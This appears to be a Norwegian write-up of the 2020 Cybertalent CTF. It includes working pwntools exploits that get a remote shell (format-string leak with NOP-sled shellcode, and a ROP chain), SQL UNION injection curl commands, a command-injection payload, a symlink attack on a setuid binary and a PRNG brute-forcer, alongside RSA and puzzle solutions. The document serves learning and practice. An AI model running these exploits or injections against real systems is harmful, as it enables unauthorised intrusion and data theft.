# E-tjenestens Cybertalent-program 2020

# 1. Grunnleggende

## 1.1_scoreboard
Denne er rimelig simpel: `cat FLAGG` og du er ferdig.

## 1.2_setuid
Her er flagget eid av en annen bruker, men du har en versjon av cat-programmet som har setuid til riktig bruker: `./cat FLAGG`

## 1.3_injection
I kildekoden, så ser man at de leser inn argumenter fra kommandolinjen og slenger de rett bak et kall til `/usr/bin/md5sum`, uten noen form for escaping. `./md5sum "FLAGG ; cat FLAGG"` vil dermed ende opp som `/usr/bin/md5sum FLAGG; cat FLAGG`, som først tar md5sum av flagget, og så printer det ut.

## 1.4_overflow
Målet er igjen å lese et flagg via et setuid-program. Etter litt enkel reversing, så ser vi at "above" skal være `ABCDEFGH`, og da hopper de til koden pekt på av `shellcode_ptr`. Stacken printes også ut, slik at det er veldig enkelt å se hvilke endringer man gjør. Det følger også med en eksempel-shellcode.

```bash
login@corax:~/1_grunnleggende/4_overflow$ export SHC=$(cat sample_shellcode)
login@corax:~/1_grunnleggende/4_overflow$ ./overflow "AA$(echo $SHC)ABCDEFGHAAAAAAAABBBBBBBBCCCCCCCC000000"
```

## 1.5_reversing
Her har man etter en gang et flagg, eid av en annen bruker, og en setuid-binary. Reversing av denne, viser at de ønsker et passord som argument, og hvis dette er riktig, så kalles `setuid(flagg_eier)` etterfulgt `/bin/bash`, slik at vi kan lese flagget.

`check_password()`-funksjonen har flere trinn. Først sjekker den at input er 32 bytes lang. Deretter at den starter med `Reverse_engineering`. Etter dette, så sjekkes det at bokstaven på index 0x13 er `_`, samt at hvis man tolker index 0x13 til 0x17 som et tall, så tilsvarer det `0x5F72655F` som er tall-representasjonen av strengen `_re_`. Til slutt, så sjekkes det om strengen slutter med `morsomt__` (fra index 0x17 og ut). 

I IDA, så ser programmet ca. slik ut

![overflow](1_4.png)

Løsningen er derfor
```bash
login@corax:~/1_grunnleggende/5_reversing$ ./check_password Reverse_engineering_er_morsomt__
```

# 2. Oppdrag
## 2.1_keystore
I første delen, så er vi på jakt etter et navn. Det hintes det til en keystore-server, med et eksempel på en URL som personen har brukt. Denne serveren er en keystore, som gir deg en public key om du gir inn et nøkkelnavn. Denne har en triviell SQL injection, noe som kan oppdages ved å legge til f.eks. `' OR '1'='1` bak `oper@cloud-mgr-15`, og så ser du at alle nøklene plutselig kommer ut.

Jeg løste dette via UNION injection. Da må man første finne ut hvor mange kolonner det er i queryen, ved å prøve `UNION SELECT 1` og så `1,2` etc. til man ikke får feilmelding.
```bash
login@corax:~$ curl -g "http://keystore/query.php?keyname=oper@cloud-mgr-15'+UNION+SELECT+1,2,3;--+-"
```

gir ikke feilmelding, og printer ut "1 2 3" i tillegg til nøkkelen, så vi kan hente ut 3 andre felt i hver spørring. Uten å gå altfor i detalj, så er teknikken herfra å sjekke i `information_schema`-databasen etter navnet på databasene vi har, så navnet på alle tabeller som finnes i databasen(e), og så finne kolonnene i hver tabell.

```bash
login@corax:~/scratch$ curl -g "http://keystore/query.php?keyname=oper@cloud-mgr-15'+UNION+ALL+(SELECT+1,2,schema_name FROM information_schema.schemata);--+-"
1 2 information_schema
1 2 keystore
```

Så vi har én database kalt `keystore`.

```bash
login@corax:~/scratch$ curl -g "http://keystore/query.php?keyname=oper@cloud-mgr-15'+UNION+ALL+(SELECT+table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema != 'information_schema');--+-"
keystore keystore key_id
keystore keystore key_type
keystore keystore key_data
keystore keystore owner
keystore user_key_upload user_id
keystore user_key_upload key_id
keystore user_key_upload upload_date
keystore userstore user_id
keystore userstore user_name
keystore userstore user_password
```

Inni den er det 3 tabeller: `keystore`, `user_key_upload` og `userstore`. Kolonnene til hver av de er også i outputen. Det som virker interessant er `userstore.user_name`. Man kan sikkert skrive en pen query som henter ut nøyaktig bruker, men jeg endte opp med å bare dumpe alle databasene. Da ser man at `oper@cloud-mgr-15`-nøkkelen har id 17693, og i `user_key_upload` får man da ut at brukeren med id 20524 har lastet opp denne. Sjekker man til sist i `userstore`, så finner man et hacker-navn.

```
20524 Elliot Alderson 014aedf1bc63277183ae5034c023c8ba
```

Etter å ha sendt inn dette flagget, får man et hint om at det er en bakdør i nøkkelgeneratoren deres. Vi tar derfor med oss alle nøklene vi dumpet videre.

## 2.2_lootd
Denne oppgaven var muligens den vanskeligste i CTFen, og en flaskehals for å løse resten av oppdraget. Det andre hintet i mission-briefen, er at det er noe kommunikasjon med `cloud-c2-70` på port 1337/TCP. Logger vi på denne med netcat, så kommer vi til en slags meny.

```bash
login@corax:~/2_oppdrag$ nc cloud-c2-70 1337
> help
./lootd: available commands: help, upload, download, uname, uptime
> uptime
 09:06:12 up 1 day, 18:18,  load average: 2.58, 2.09, 2.17
> uname
Linux bovinae 4.8.0+ #1 SMP Thu Oct 13 20:07:36 UTC 2016 x86_64 Linux
> download
filename > /etc/passwd
access token > ???
done. 0 bytes
>
```

Så det er et program som lar oss laste opp og ned ting, men vi blir spurt om en access token ved nedlasting. Litt prøving og feiling senere, så finner vi ut to viktige komponenter: Programmet heter `lootd`, gitt av feilmelding man får ved ugyldig kommando, og at download-funksjonen ikke spør om access token med mindre man forsøker å laste ned filbaner uten "/" eller "." i seg. Skriver vi `lootd`, så får vi en lang hex dump av lootd-programmet til lokal analyse.

Neste steg er å reverse `lootd`. For å kjøre det lokalt, må man installere `musl`, ettersom programmet ikke er linket mot standard libc. Etter en del reversing, så ser man litt mer av funksjonaliteten i programmet. `uname` bare printer ut en statisk streng, `uptime` kaller faktisk uptime-prosessen via popen, `download` laster ned filer, men trenger key hvis dot eller slash er i filnavnet - og saniterer en del tegn fra både filnavn og token. Til sist, så er det `upload`-funksjonen. Den spør om hvor mange bytes du vil sende, og så leser den inn like mange bytes og sender de til et program kalt `/usr/sbin/moveloot`. Dette kommer vi tilbake til.

Målet vårt her, er å misbruke en feil i dette programmet til å få tilgang til `cloud-c2-70`. Her er det faktisk flere løsningsmetoder, og jeg løste dette på to ulike måter. La oss begynne med å sjekke sikkerheten til ELF-programmet.

```bash
root@2731165f2892:/ctf/work# checksec lootd.bin
[*] '/ctf/work/lootd.bin'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
```

For de som har gjort `pwn`-challenges før, så burde det umiddelbart ringe en bjelle. NX (non-executable stack) er skrudd av. Dette er skrudd på som standard omtrent overalt, og det betyr at beskyttelsen med vilje har blitt skrudd av. !NX lar oss kjøre kode på stacken, hvis vi klarer å hoppe dit. Akkurat som i gamle dager. Deretter er det greit å merke seg at PIE er skrudd på, slik at om vi ønsker å løse oppgaven med ROP, så må vi ha en PIE leak for å finne ut hvilken adresse programmet er lastet inn på.

For en buffer overflow-løsning, så trengs det tre ting: En måte å lekke en peker til en stack-adresse du vet hvor er, en måte å legge inn shellcode på stacken (f.eks. via en input-mekanisme), og muligheten til å styre programflyten, slik at du ender opp med å kjøre shellcode.

For ROP, så trenger man en PIE leak, og offsets til ROP gadgets i f.eks. musl sin libc. For å finne offsets, må man fort gjette på OSet som kjøres i bakkant, for å finne den eksakt samme versjonen selv. Alternativt kan man forsøke å lekke adressene til enkeltfunksjoner, og bruke distansen mellom disse til å søke i en libc-database etter versjonen som er brukt.

Heldigvis har `lootd` enormt mange sikkerhetshull, så alt som er nevnt er mulig. Og mere til. Først og fremst, så vil programmet skrive ut en feilmelding hvis man skriver en ugyldig kommando, og denne meldingen inneholder det du skrev inn. Feilen er at denne skrives ut med `printf`, og vi kan derfor bruke format strings. Hvis input er f.eks. `"%p %p %p"`, så vil `printf` begynne å skrive ut verdier oppover stacken. Man kan også bruke `%n` til å lage en write-primitive med denne alene.

En annen, gigantisk tabbe, er at det meste av input lese inn med `gets()`, som bare leser og leser, lenge etter at bufferet den skriver til er fylt opp. Dette lar oss trivielt overskrive retur-adressen på stacken, mens vi er inne i f.eks. download-funksjonen. `gets()` leser til newline eller EOF, og lar oss også legge inn null-bytes, som terminerer strenger.

Disse feilene kombinert, oppfyller kravene vi hadde til buffer overflow, så strategien er dermed:

1. Lekk en stack-adresse via format string. Bruk denne til å regne ut hvor input-feltet til kommandoen blir lagt inn.
2. Hopp inn i download-funksjonen, ved å skrive inn `download\x00` etterfulgt av NOP sled og shellcode. Funksjonen som sjekker kommando, stopper med en gang den kommer til null-byten, og tror derfor at du har skrevet inn `download`. Nå er du inne i download-funksjonen, og har shellcode på stacken.
3. Overskriv retur-adressen til download-funksjonen, ved å overflowe filnavn-bufferet. Få denne til å peke på NOP-sleden. Hvis filnavnet inneholder et av de "forbudte" tegnene, så vil funksjonen avslutte tidlig uten å kalle moveloot.

Etter å ha hentet ut adressen til input-arrayet i en debugger, så virker exploiten helt fint på min lokale maskin, men ikke på remote. Dette er fordi stacken inkluderer ting som ENV fra shell, og layouten blir derfor annerledes fra maskin til maskin. Dette krever litt eksperimentering for å få til helt riktig, men med en lang nok NOP sled trenger man ikke være altfor treffsikker. I dette scriptet har jeg justert adressene opp med 32 bytes, etter litt eksperimentering.

```python
from pwn import *
import sys

INPUT_ADDR = 0x7fffffffe590
STACK_BASE_LEAK = 0x7fffffffe320
DIFF_TO_INPUT = INPUT_ADDR - STACK_BASE_LEAK + 32
SHELLCODE = bytes.fromhex("31c048bbd19d9691d08c97ff48f7db53545f995257545eb03b0f05")

r = remote("cloud-c2-70", 1337)
r.sendlineafter("> ", "%p.%p.%p.%p.%p.%p.%p")

leaks = r.readline().split(b".")
STACK_LEAK = eval(leaks[-4].decode())
print("Stack leak", hex(STACK_LEAK))

payload = b"download\x00"
payload += SHELLCODE.rjust(0x400-len(payload), b"\x90")
r.sendlineafter("> ", payload)

payload = b"'"*0x118
payload += p64(STACK_LEAK+DIFF_TO_INPUT)
r.sendlineafter("filename >", payload)

r.interactive()
```

Dette gir et shell på serveren, og `cat FLAG` printer dette ut.

Alternativ løsningemetode, via ROP:

```python
from pwn import *
context.arch = 'amd64'

s = remote('cloud-c2-70', 1337)

s.sendlineafter('> ', '%p.%3$p')
leaks = s.recvline().split(b"'")[1].split(b'.')
libc_address = int(leaks[1], 16) - 0x93b40

POP_RDI = libc_address + 0x152bc
BIN_SH = libc_address + 0x8e3c9
SYSTEM = libc_address + 0x3dc5f

p = b'A' * 136
p += p64(POP_RDI)
p += p64(BIN_SH)
p += p64(SYSTEM)

s.sendlineafter('> ', p)
s.interactive()
```

Resultatet er det samme, men uten å vite versjonene av alt, så kan denne metodikken være litt vanskeligere. Det er også mulig å løse denne oppgaven via format-string, muligens ved å overskrive strengen `uptime` med `ash` eller lignende, men jeg undersøkte ikke dette noe nærmere.

## 2.3_loot_home

Fra forrige oppgave, så lander vi i `/home/lootd`, hvor det ligger et flagg. Det ligger også et flagg i `/home/`, så `cat ../FLAG` printer ut dette.

## 2.4_loot_vault

Målet med denne oppgaven, er å få tilgang til `/vault/loot`, som er eid av brukeren `vault`. Etter exploiten fra 2.2 er vi "innlogget" som brukeren `lootd`, så vi har ikke tilgang til å en gang liste filer i loot-mappen. `/usr/sbin/moveloot`, som blir kalt fra `lootd`, er derimot en setuid-binary eid av `vault`, så den har tilgang.

`moveloot` tar 3 parametere: filnavn, access token, og et valgfritt sekvensnummer. Hvis filnavn ikke er spesifisert, så leser moveloot inn data og skriver dette til en fil inne i `/vault/loot`, hvor navnet er tilfeldig generert. Hvis filnavn er spesifisert, så forsøker den å lese ut filen. Om filnavn inneholder slash eller dot, så må access token være spesifisert, og denne må matche inneholdet i `/vault/loot/key`.

For dette flagget, så opprettet jeg et symbolsk lenke i `/home/lootd` som pekte på `/vault/loot/key`, og så gjettet jeg at det fantes en fil kalt `FLAG` inni der.

```bash
$ pwd
/home/lootd
$ ln -s /vault/loot/key key
$ /usr/sbin/moveloot -f key
81f75f6eda0a961eba3b4e6ce7400510
$ /usr/sbin/moveloot -f /vault/loot/FLAG -k 81f75f6eda0a961eba3b4e6ce7400510
```

Nøkkelen er md5("sandworm"), og vi kan nå lese alle filer eid av `vault` hvis vi vet navnet på de.

En alternativ løsning på denne oppgaven, er å utnytte at kernelen er dødsgammel: `Linux e1e9616e7e75 4.8.0+ #15 SMP Thu Oct 13 20:07:36 UTC 2016 x86_64 Linux`.
Denne versjonen er sårbar mot f.eks. Dirty cow, som enkelt lar deg overskrive en suid-binary (mount eller umount) med shellcode. Bare pass på at den peker på `/bin/ash`, da `bash` ikke finnes på serveren.

## 2.5_headquarters

Denne oppgaven kan løses rett etter man har løst 2.2, og avhenger kun av 2.1 og muligheten til å lese filer som `vault`.

Inne i `/home/vault/.ash_history`, ligger det noen kommandoer som denne brukeren har kjørt:

```bash
url -o /tmp/xxx http://keystore/query.php?keyname=oper@cloud-mgr-72
cat /tmp/xxx
rm -rf /tmp/xx
exit
find /vault/loot -type f
find /vault/loot -type f | wc -l
du -ms /vault/loot
curl http://keystore/query.php?keyname=oper@cloud-hq-42
vi id
tar cz /vault/loot | ssh -i id oper@cloud-hq-42 lootimport
rm id
exit
```

De har altså logget seg på en annen server, `oper@cloud-hq-42` vha. en private key. De har også lastet ned nøkkelen til `/tmp/xxx`, men tukla til slettingen av den, så den ligger der enda. `xxx` er derimot eid av `vault`, så vi kan ikke lese den ut direkte. Forsøker vi å spørre keystore-serveren om den samme nøkkelen, så ser vi også at den ikke eksisterer lengre. Men vha. de samme teknikkene som i 2.4, så kan man lese ut innholdet av denne:

```
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDF5303+AgwCFCG+e2TyB3CcNm+qPwrdkHzwrnqLrWC3+2TbiXBhWH/mGCVwJ9HmFcYXoYNvNP9c3s6XyZI4otiwn7XGyUW1adR2h89+ExNpYMJX4EQaKPgHSe9vku2IkzxvTUut2mxCZVzM6r7U9IrHmQt+degexjd0DGvF+AFjOqfEJP8hWDdZzZee3QJPWCwJi65I1148Sz/y10ORdWwVGhYl9Wsg20iXM+m/4xBfIhkCEiI3UCwYQFvLoXg+k9L4ogrHaAoX9/FrNi1HwthOGSr/h89TyP3KzAN3/jUSzLkl3AtENzDe2xtXyMMd3qXHoxat2k1FepPj8S74oIp oper@cloud-mgr-72
```

bare for å oppdage at dette er en public key, ikke en private key. Så den er ikke så nyttig til å logge inn over SSH med. Men her kommer teksten fra tidligere til unnsetning - den om at nøkkel-generatoren hadde en bakdør.

Nøkkelen her er en RSA-nøkkel, så for å gjøre om denne public keyen til en private key, så trenger vi å faktorisere produktet av to gigantiske primtall. Heldigvis, så har de lagt inn en bakdør, slik at flere av produktene har samme primtall. Dette er svært kjapt å sjekke med f.eks. Euler's Algoritme. Se på [2_5_privkey.py](2_5_privkey.py) for et eksempel på hvordan man kan generere en private key ut i fra det vi vet.

Etter at vi har private key, så er det bare å kjøre `ssh -i privkey.pem oper@cloud-hq-42` og så ligger flagget der. I tillegg finner vi `/bin/crypt0r`-filen, som er brukt til å kryptere data, samt lootimpor-scriptet som ble referert til i historikken:

```bash
oper@hq ~ > which lootimport
/bin/lootimport
oper@hq ~ > cat /bin/lootimport
#!/bin/sh
set -ex
d=$(mktemp -d)
tar xz -C $d
#find $d -type f | xargs -n1 cat | crypt0r "precise stallion cell nail" | less
```

## 2.6_decryption

Hvis man løste 2.4 ved å roote serveren, så er denne mer eller mindre triviell. Hent ut filene fra `/vault/loot`, og dekrypter de med `crypt0r`-programmet. `crypt0r` er et enkelt program, som kjører en key schedule på argumentet som gis inn, og så krypterer den data via en stream cipher. Metodikken her tilsvarer RC4-kryptering, og en tilsvarende versjon i Python ser sånn her ut:

```python
from Crypto.Cipher import ARC4

def decrypt(ciph, key):
    return ARC4.new(key).decrypt(ciph)

plaintext = open("encrypted_flag", "rb").read()
password = "precise stallion cell nail"
print(decrypt(plaintext, password))
```

merk at siden dette er en enkel stream cipher med XOR, så er decrypt og encrypt den samme funksjonen, og de er inverser av hverandre.

Jeg løste derimot denne uten root på serveren, ved å utnytte den dårlige entropien i navngivningen av filer. Når en fil blir lest inn via `moveloot`, så flytter den nemlig innholdet over i en fil med et "tilfeldig" navn. Først så bygger den strengen `/vault/loot/seq.%04zx.` hvor sekvensnummeret puttes inn i format-stringen. Hvis denne ikke er spesifisert som et argument til `moveloot`, så er den "0000". Deretter kalles `'a' + random() % 26` for å generere en tilfeldig bokstav mellom 'a' og 'z', og dette gjøres 64 ganger.

Resultatet blir da en fil med et navn som `seq.0000.zeicfgrnvksuptofqkcopbgbbppogemfiujncbdynvsdqgigqnwhqcktubicfuhn`. Problemet her, er at `random()`-funksjonen er en PRNG, og attpåtil seedet med klokkeslettet når programmet ble startet, rundet av til nærmeste sekund. Siden vi har lest ut `/vault/loot/key`, så kan vi be `moveloot` om å lese ut filer, mot at vi vet navnet på de. Strategien er derfor å generere mulige filnavn bakover i tid, og så be moveloot om å lese disse ut. Kommer det blank output, så fantes ikke filen. Kommer det noe random gibberish, så vet vi at vi har funnet noe kryptert.

Jeg kompilerte dette programmet med musl, og lastet det opp til `cloud-c2-70`. Så pipet jeg outputen via base64, slik at eventuelle binærdata som kom ut kunne klippes og limes fra terminalen.

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>

char buf[0x200] = {0};

int main(int argc, char *argv[])
{
    if (argc != 3)
    {
        printf("Usage: ./gen epoch hours");
        exit(1);
    }
    
    uint32_t epoch = atoi(argv[1]);
    uint32_t hours = atoi(argv[2]);
    
    for(uint32_t i=0; i<3600*hours; i++)
    {
        srandom(epoch--);
        memset(buf, 0, sizeof(buf));
        int v2 = snprintf(buf, 0x100uLL, "/usr/sbin/moveloot -k 81f75f6eda0a961eba3b4e6ce7400510 -f /vault/loot/seq.%04zx.", (size_t)0);
        for(int i=0; i<64; i++)
        {
            buf[v2+i] = (random() % 26) + 'a';
        }
        system(buf);
    }
    printf("Finished.\n");
    return 0;
}
```

Her spesifiserer du bare start-epoch, og antall timer å spole bakover, og så kommer det krypterte flagget til slutt. Deretter gjenstår det bare å kjøre outputen gjennom en base64-decode, og bruke crypt0r eller Python-ekvivalenten til å dekryptere flagget med.

Det var også en fil til inne i vault, og etter å ha brukt en del tid på å hente ut denne, så fant jeg ut at det bare var en offentlig tilgjengelig PDF fra Etteretningstjensten ("Fokus 2020").

# 3.1. Hjernetrim lett
## 3.1.1_clmystery

Denne oppgaven finnes [på nett](https://github.com/veltman/clmystery). Jeg leste på nett hva svaret var, lastet ned begge mappestrukturene, og kjørte rekursiv diff på de.

```
336c336
< Jeremy Bowers
---
> Victor Sidney
```

Løsningen var da "Victor Sidney"

## 3.1.2_knock-knock

Denne oppgaven var... virkelig spesiell. Den inneholder en Ken-dukke, iført fengelsdrakt, som er knyttet opp mot en servo. Han slår rytmisk på et metallgjerde, og dette skal vi altså få et flagg ut av. Etter litt analyse, så virker det ikke som om dette er morse, ettersom antall dunk før et lengre mellomrom er altfor mange, og varierer for lite. Det høres ut som om det kommer et visst antall dunk, etterfulgt av en kort pause, så flere dunk etterfulgt av en lang pause. Antall dunk varierer fra 1 til 5. Setter vi dette opp som en sekvens av par, får vi 

`34 42 14 15 44 14 45 31 15 44 15 42 15 44 44 15 42 15 42 44 11 35 14 11 33 13 15`

og først etter litt Googlig av koder brukt i fengsel, fant jeg fram til [Tap code](https://en.wikipedia.org/wiki/Tap_code). Via tabellen på Wikipedia, leser vi ut `ordetduleteretterertapdance`, så flagget er `tapdance`.

## 3.1.3_runer

Et bilde med runer, med et litt spesielt rune-alfabet. Leser vi direkte av runene, så blir det bare tull, men ser man i kommentarene til bildet så står det `Columns`. Etter litt kolonne-transposisjon, får vi ut `FUTHARKRUNERERINTERESSANT`.

## 3.1.4_sharing_secrets
Alle disse oppgavene krever at du løser andre oppgaver, og får N shares. Deretter er det bare å plugge de inn i f.eks. Sage

```python
sage: p = 162259276829213363391578010288127
sage: F = FiniteField(p)
sage: P = F['x']
sage: shares = [(F(x), F(y)) for x,y in [(1,84657984464390529825364497916194), (
....: 2,73673086149599787963942979835811), (5,38135776304496424228868822226466)]
....: ]
sage: P.lagrange_polynomial(shares)
107957633311081314081817873244735*x^2 + 151920032239605406067858893049793*x + 149298872572130536458843752197920
```
og så får man at `149298872572130536458843752197920` er en av løsningene. Det er mange måter å løse denne typen oppgave på, inkludert online-verktøy.

## 3.1.5_webcruiter

Hemmelig flagg, gjemt i stillingsbeskrivelsen

# 3.2. Hjernetrim middels
## 3.2.1_artwork_del_1

Del 1 krever bare at du skjønner at bildet er et [Piet](https://www.dangermouse.net/esoteric/piet.html)-program. Dette hintes til via quoten på bildet, samt at filnavnet er md5("esoteric"), og Piet er et esoterisk programmeringsspråk. Løsningen er å kalkulere `HAVAL('mondrian')` = `153ceff44d69be87e33b1439c14899e8`

## 3.2.1_artwork_del_2

Del 2 kan løses på mange måter, men den enkleste er kanskje å bare utnytte `npiet` sin tracing-funksjon. Siden bokstavene i passordet sjekkes hver for seg, og programmet hopper rett til feil-tilstanden ved første uriktige bokstav, så kan vi brute-force passordet ved å se på lengden av tracen.

```python

from string import printable
from subprocess import Popen, PIPE

pw = ""
running = True

while running:
    best_score = 0
    best_char = None
    for c in printable[:-6]:
        p = Popen(["npiet.exe", "dbc6486d9c1788ccce2f4ece3e498fb3.png", "-t"], stdin=PIPE, stdout=PIPE)
        out = p.communicate(pw+c+"\n")
        score = out[0].count("\n")
        if score > best_score:
            best_score = score
            best_char = c
            
    pw += best_char
    print(pw)

# Tr0ub4d0r&3
```

Output av det passordet blir `correct horse battery staple`, som også er flagget.

## 3.2.2_explosion

Denne oppgaven forsøker å regne ut summen av [Ackermann(n,n)](https://en.wikipedia.org/wiki/Ackermann_function) for n fra 0 til og med argumentet til programmet. Resultatet printes modulo `15^15`. Ackermann(4,4) forsøker å regne ut 2^2^2^65536, som er et altfor stort tall til å regne ut. Enda høyere tall er utenkelig store.

Siden resultatet er modulo et tall, så går det derimot an å gjøre en optimalisering. [Denne](https://sasdf.cf/ctf/writeup/2019/plaid/rev/bigmaffs/) writeupen av en annen oppgave, forklarer matematiken bak løsningen ganske greit. Det viktige, er at for en høy `n`, så er det kun moduloen som har noe å si for hva resultatet blir. [Project Euler 282](https://projecteuler.net/problem=282) er også svært lik denne oppgaven, bare med en annen modulo.

Løsningen er å gjøre modular exponentiation for hver primtallsfaktor av moduloen, og så kombinere svarene via chinese remainder theorem. Vi trenger da bare å regne ut Ackermann(4,4) og Ackermann(100,100), ettersom N=5,6,7...Inf er akkurat det samme tallet.

[Denne løsningen](3_2_ackermann.py) på Euler 282 har blitt endret til å fungere for denne oppgaven.
